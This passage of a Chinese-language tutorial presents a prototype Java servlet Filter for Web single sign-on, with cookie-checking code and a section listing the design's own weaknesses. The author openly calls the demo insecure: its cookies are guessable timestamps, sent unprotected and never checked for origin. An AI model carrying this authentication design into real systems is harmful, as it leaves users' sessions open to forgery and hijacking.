style="font-size:12pt">对应的用户是谁。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">如果</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">效验成功，就允许用户访问当前请求的资源。</span></li></ul>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">以上这些功能，可以用很多方法来实现：</span></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">在每个被访问的资源中（</span><span style="font-size:12pt">JSP</span><span style="font-size:12pt">或</span><span style="font-size:12pt">Servlet</span><span style="font-size:12pt">）中都加入身份认证的服务，来获得</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">，并且判断当前用户是否登录过。不过这个笨方法没有人会用</span><span style="font-size:12pt">:-)</span><span style="font-size:12pt">。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">可以通过一个</span><span style="font-size:12pt">controller</span><span style="font-size:12pt">，将所有的功能都写到一个</span><span style="font-size:12pt">servlet</span><span style="font-size:12pt">中，然后在</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">映射的时候，映射到所有需要保护的</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">集合中（例如</span><span style="font-size:12pt">*.jsp</span><span style="font-size:12pt">，</span><span style="font-size:12pt">/security/*</span><span style="font-size:12pt">等）。这个方法可以使用，不过，它的缺点是不能重用。在每个应用中都要部署一个相同的</span><span style="font-size:12pt">servlet</span><span style="font-size:12pt">。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">Filter</span><span style="font-size:12pt">是比较好的方法。符合</span><span style="font-size:12pt">Servlet2.3</span><span style="font-size:12pt">以上的</span><span style="font-size:12pt">J2EE</span><span style="font-size:12pt">容器就具有部署</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">的功能。（</span><span style="font-size:12pt">Filter</span><span style="font-size:12pt">的使用可以参考</span><span style="font-size:12pt">JavaWolrd</span><span style="font-size:12pt">的文章</span><span style="font-size:12pt">http://www.javaworld.com/javaworld/jw-06-2001/jw-0622-filters.html</span><span style="font-size:12pt">）</span><span style="font-size:12pt">Filter</span><span style="font-size:12pt">是一个具有很好的模块化，可重用的编程</span><span style="font-size:12pt">API</span><span style="font-size:12pt">，用在</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">正合适不过。本样例就是使用一个</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">来完成以上的功能。</span></li></ul>&#13;
<div align="left"> </div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt">package SSO;</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">import java.io.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import java.net.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import java.util.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import java.text.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import javax.servlet.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import javax.servlet.http.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import javax.servlet.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import org.apache.commons.httpclient.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import org.apache.commons.httpclient.methods.GetMethod;</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">public class SSOFilter implements Filter {</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">private FilterConfig filterConfig = null;</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">private String cookieName="WangYuDesktopSSOID";</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">private String SSOServiceURL= "http://wangyu.prc.sun.com:8080/SSOAuth/SSOAuth";</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">private String SSOLoginPage= "http://wangyu.prc.sun.com:8080/SSOAuth/login.jsp";</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">public void init(FilterConfig filterConfig) {</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">this.filterConfig = filterConfig;</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">if (filterConfig != null) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">if (debug) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">log("SSOFilter:Initializing filter");</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}       </span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">cookieName = filterConfig.getInitParameter("cookieName");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">SSOServiceURL = filterConfig.getInitParameter("SSOServiceURL");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">SSOLoginPage = filterConfig.getInitParameter("SSOLoginPage");</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">} </span></div>&#13;
<div align="left"><span style="font-size:12pt">.....</span></div>&#13;
<div align="left"><span style="font-size:12pt">.....</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">}</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">以上的初始化的源代码有两点需要说明：一是有两个需要配置的参数</span><span style="font-size:12pt">SSOServiceURL</span><span style="font-size:12pt">和</span><span style="font-size:12pt">SSOLoginPage</span><span style="font-size:12pt">。因为当前的</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用很可能和身份认证服务（</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">）不在同一台机器上，所以需要让这个</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">知道身份认证服务部署的</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">，这样才能去调用它的服务。另外一点就是由于身份认证的服务调用是要通过</span><span style="font-size:12pt">http</span><span style="font-size:12pt">协议来调用的（在本样例中是这样设计的，读者完全可以设计自己的身份服务，使用别的调用协议，如</span><span style="font-size:12pt">RMI</span><span style="font-size:12pt">或</span><span style="font-size:12pt">SOAP</span><span style="font-size:12pt">等等），所有笔者引用了</span><span style="font-size:12pt">apache</span><span style="font-size:12pt">的</span><span style="font-size:12pt">commons</span><span style="font-size:12pt">工具包（详细信息情访问</span><span style="font-size:12pt">apache </span><span style="font-size:12pt">的网站</span><span style="font-size:12pt">http://jakarta.apache.org/commons/index.html</span><span style="font-size:12pt">），其中的</span><span style="font-size:12pt">“</span><span style="font-size:12pt">httpclient”</span><span style="font-size:12pt">可以大大简化</span><span style="font-size:12pt">http</span><span style="font-size:12pt">调用的编程。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">下面看看</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">的主体方法</span><span style="font-size:12pt">doFilter():</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt">public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">if (debug) log("SSOFilter:doFilter()");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">HttpServletRequest request = (HttpServletRequest) req;</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">HttpServletResponse response = (HttpServletResponse) res;</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String result="failed";</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String url = request.getRequestURL().toString();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String qstring = request.getQueryString();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">if (qstring == null) qstring ="";</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">//</span><span style="font-size:12pt">检查</span><span style="font-size:12pt">http</span><span style="font-size:12pt">请求的</span><span style="font-size:12pt">head</span><span style="font-size:12pt">是否有需要的</span><span style="font-size:12pt">cookie</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String cookieValue ="";</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">javax.servlet.http.Cookie[] diskCookies = request.getCookies();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">if (diskCookies != null) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">for (int i = 0; i &lt; diskCookies.length; i++) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">if(diskCookies[i].getName().equals(cookieName)){</span></div>&#13;
<div align="left"><span style="font-size:12pt">                    </span><span style="font-size:12pt">cookieValue = diskCookies[i].getValue();</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">                    </span><span style="font-size:12pt">//</span><span style="font-size:12pt">如果找到了相应的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">则效验其有效性</span></div>&#13;
<div align="left"><span style="font-size:12pt">                    </span><span style="font-size:12pt">result = SSOService(cookieValue);</span></div>&#13;
<div align="left"><span style="font-size:12pt">                    </span><span style="font-size:12pt">if (debug) log("found cookies!");</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">if (result.equals("failed")) { //</span><span style="font-size:12pt">效验失败或没有找到</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">，则需要登录</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">response.sendRedirect(SSOLoginPage+"?goto="+url);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} else if (qstring.indexOf("logout") &gt; 1) {//logout</span><span style="font-size:12pt">服务</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">if (debug) log("logout action!");</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">logoutService(cookieValue);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">response.sendRedirect(SSOLoginPage+"?goto="+url);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} else {//</span><span style="font-size:12pt">效验成功</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">request.setAttribute("SSOUser",result);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">Throwable problem = null;</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">try {</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">chain.doFilter(req, res);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">} catch(Throwable t) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">problem = t;</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">t.printStackTrace();</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">}      </span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">if (problem != null) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">if (problem instanceof ServletException) throw (ServletException)problem;</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">if (problem instanceof IOException) throw (IOException)problem;</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">sendProcessingError(problem, res);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}  </span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">doFilter()</span><span style="font-size:12pt">方法的逻辑也是非常简单的，在接收到请求的时候，先去查找是否存在期望的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">值，如果找到了，就会调用</span><span style="font-size:12pt">SSOService(cookieValue)</span><span style="font-size:12pt">去效验这个</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的有效性。如果</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">效验不成功或者</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">根本不存在，就会直接转到登录界面让用户登录；如果</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">效验成功，就不会做任何阻拦，让此请求进行下去。在配置文件中，有下面的一个节点表示了此</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">的</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">映射关系：只拦截所有的</span><span style="font-size:12pt">jsp</span><span style="font-size:12pt">请求。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">&lt;filter-mapping&gt;<br />&#13;
&lt;filter-name&gt;SSOFilter&lt;/filter-name&gt;<br />&#13;
&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;<br />&#13;
&lt;/filter-mapping&gt;</span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left"><span style="font-size:12pt">下面还有几个主要的函数需要说明：</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">private String SSOService(String cookievalue) throws IOException {</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String authAction = "?action=authcookie&amp;cookiename=";</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">HttpClient httpclient = new HttpClient();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">GetMethod httpget = new GetMethod(SSOServiceURL+authAction+cookievalue);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">try { </span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">httpclient.executeMethod(httpget);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">String result = httpget.getResponseBodyAsString();</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">return result;</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} finally {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">httpget.releaseConnection();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">private void logoutService(String cookievalue) throws IOException {</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String authAction = "?action=logout&amp;cookiename=";</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">HttpClient httpclient = new HttpClient();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">GetMethod httpget = new GetMethod(SSOServiceURL+authAction+cookievalue);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">try {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">httpclient.executeMethod(httpget);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">httpget.getResponseBodyAsString();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} finally {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">httpget.releaseConnection();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">这两个函数主要是利用</span><span style="font-size:12pt">apache</span><span style="font-size:12pt">中的</span><span style="font-size:12pt">httpclient</span><span style="font-size:12pt">访问</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">提供的认证服务来完成效验</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">和</span><span style="font-size:12pt">logout</span><span style="font-size:12pt">的功能。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">其他的函数都很简单，有很多都是我的</span><span style="font-size:12pt">IDE</span><span style="font-size:12pt">（</span><span style="font-size:12pt">NetBeans</span><span style="font-size:12pt">）替我自动生成的。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><em><span style="font-size:14pt">4 </span><span style="font-size:14pt">当前方案的安全局限性</span></em></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">当前这个</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">的方案是一个比较简单的雏形，主要是用来演示</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的概念和说明</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">技术的实现方式。有很多方面还需要完善，其中安全性是非常重要的一个方面。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">我们说过，采用</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">技术的主要目的之一就是加强安全性，降低安全风险。因为采用了</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">，在网络上传递密码的次数减少，风险降低是显然的，但是当前的方案却有其他的安全风险。由于</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">是一个用户登录的唯一凭据，对</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的保护措施是系统安全的重要环节：</span></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的长度和复杂度</span><span style="font-size:12pt"><br />&#13;
</span><span style="font-size:12pt">在本方案中，</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">是有一个固定的字符串（我的姓名）加上当前的时间戳。这样的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">很容易被伪造和猜测。怀有恶意的用户如果猜测到合法的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">就可以被当作已经登录的用户，任意访问权限范围内的资源</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的效验和保护</span><span style="font-size:12pt"><br />&#13;
</span><span style="font-size:12pt">在本方案中，虽然密码只要传输一次就够了，可</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">在网络中是经常传来传去。一些网络探测工具（如</span><span style="font-size:12pt">sniff, snoop,tcpdump</span><span style="font-size:12pt">等）可以很容易捕获到</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的数值。在本方案中，并没有考虑</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">在传输时候的保护。另外对</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的效验也过于简单，并不去检查发送</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的来源究竟是不是</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">最初的拥有者，也就是说无法区分正常的用户和仿造</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的用户。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">当其中一个应用的安全性不好，其他所有的应用都会受到安全威胁</span><span style="font-size:12pt"><br />&#13;
</span><span style="font-size:12pt">因为有</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">，所以当某个处于 </span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的应用被黒客攻破，那么很容易攻破其他处于同一个</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">保护的应用。</span></li></ul>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">这些安全漏洞在商业的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">解决方案中都会有所考虑，提供相关的安全措施和保护手段，例如</span><span style="font-size:12pt">Sun</span><span style="font-size:12pt">公司的</span><span style="font-size:12pt">Access&#13;
 Manager</span><span style="font-size:12pt">，</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的复杂读和对</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的保护都做得非常好。另外在</span><span style="font-size:12pt">OpneSSO </span><span style="font-size:12pt">（</span><span style="font-size:12pt"><a target="_blank" href="https://opensso.dev.java.net/" style="color:rgb(119,0,0); text-decoration:none">https://opensso.dev.java.net</a></span><span style="font-size:12pt">）的架构指南中也给出了部分安全措施的解决方案。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><em><span style="font-size:14pt">5 </span><span style="font-size:14pt">当前方案的功能和性能局限性</span></em></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">除了安全性，当前方案在功能和性能上都需要很多的改进：</span></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">当前所提供的登录认证模式只有一种：用户名和密码，而且为了简单，将用户名和密码放在内存当中。事实上，用户身份信息的来源应该是多种多样的，可以是来自数据库中，</span><span style="font-size:12pt">LDAP</span><span style="font-size:12pt">中，甚至于来自操作系统自身的用户列表。还有很多其他的认证模式都是商务应用不可缺少的，因此</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的解决方案应该包括各种认证的模式，包括数字证书，</span><span style="font-size:12pt">Radius</span><span style="font-size:12pt">， </span><span style="font-size:12pt">SafeWord </span><span style="font-size:12pt">，</span><span style="font-size:12pt">MemberShip</span><span style="font-size:12pt">，</span><span style="font-size:12pt">SecurID</span><span style="font-size:12pt">等多种方式。最为灵活的方式应该允许可插入的</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">框架来扩展身份认证的接口</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">我们编写的</span><span style="font-size:12pt">Filter</span><span style="font-size:12pt">只能用于</span><span style="font-size:12pt">J2EE</span><span style="font-size:12pt">的应用，而对于大量非</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">的</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用，却无法提供</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">服务。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">在将</span><span style="font-size:12pt">Filter</span><span style="font-size:12pt">应用到</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用的时候，需要对容器上的每一个应用都要做相应的修改，重新部署。而更加流行的做法是</span><span style="font-size:12pt">Agent</span><span style="font-size:12pt">机制：为每一个应用服务器安装一个</span><span style="font-size:12pt">agent</span><span style="font-size:12pt">，就可以将</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">功能应用到这个应用服务器中的所有应用。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">当前的方案不能支持分别位于不同</span><span style="font-size:12pt">domain</span><span style="font-size:12pt">的</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用进行</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">。这是因为浏览器在访问</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">服务器的时候，仅仅会带上和当前</span><span style="font-size:12pt">web</span><span style="font-size:12pt">服务器具有相同</span><span style="font-size:12pt">domain</span><span style="font-size:12pt">名称的那些</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">。要提供跨域的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的解决方案有很多其他的方法，在这里就不多说了。</span><span style="font-size:12pt">Sun</span><span style="font-size:12pt">的</span><span style="font-size:12pt">Access&#13;
 Manager</span><span style="font-size:12pt">就具有跨域的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的功能。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">另外，</span><span style="font-size:12pt">Filter</span><span style="font-size:12pt">的性能问题也是需要重视的方面。因为</span><span style="font-size:12pt">Filter</span><span style="font-size:12pt">会截获每一个符合</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">映射规则的请求，获得</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">，验证其有效性。这一系列任务是比较消耗资源的，特别是验证</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">有效性是一个远程的</span><span style="font-size:12pt">http</span><span style="font-size:12pt">的调用，来访问</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">的认证服务，有一定的延时。因此在性能上需要做进一步的提高。例如在本样例中，如果将</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">映射从“</span><span style="font-size:12pt">.jsp</span><span style="font-size:12pt">”</span><span style="font-size:12pt">改成“</span><span style="font-size:12pt">/*</span><span style="font-size:12pt">”</span><span style="font-size:12pt">，也就是说</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">对所有的请求都起作用，整个应用会变得非常慢。这是因为，页面当中包含了各种静态元素如</span><span style="font-size:12pt">gif</span><span style="font-size:12pt">图片，</span><span style="font-size:12pt">css</span><span style="font-size:12pt">样式文件，和其他</span><span style="font-size:12pt">html</span><span style="font-size:12pt">静态页面，这些页面的访问都要通过</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">去验证。而事实上，这些静态元素没有什么安全上的需求，应该在</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">中进行判断，不去效验这些请求，性能会好很多。另外，如果在</span><span style="font-size:12pt">filter</span><span style="font-size:12pt">中加上一定的</span><span style="font-size:12pt">cache</span><span style="font-size:12pt">，而不需要每一个</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">效验请求都去远端的身份认证服务中执行，性能也能大幅度提高。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">另外系统还需要很多其他的服务，如在内存中定时删除无用的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">映射等等，都是一个严肃的解决方案需要考虑的问题。</span></li></ul>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><em><span style="font-size:14pt">6 </span><span style="font-size:14pt">桌面</span><span style="font-size:14pt">SSO</span><span style="font-size:14pt">的实现</span></em></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">从</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">的概念延伸开，我们可以把</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的技术拓展到整个桌面的应用，不仅仅局限在浏览器。</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的概念和原则都没有改变，只需要再做一点点的工作，就可以完成桌面 </span><span style="font-size:12pt">SSO </span><span style="font-size:12pt">的应用。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">和</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">一样，关键的技术也在于如何在用户登录过后保存登录的凭据。在</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">中，登录的凭据是靠浏览器的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">机制来完成的；在桌面应用中，可以将登录的凭证保存到任何地方，只要所有</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的桌面应用都共享这个凭证。</span></div>&#13;
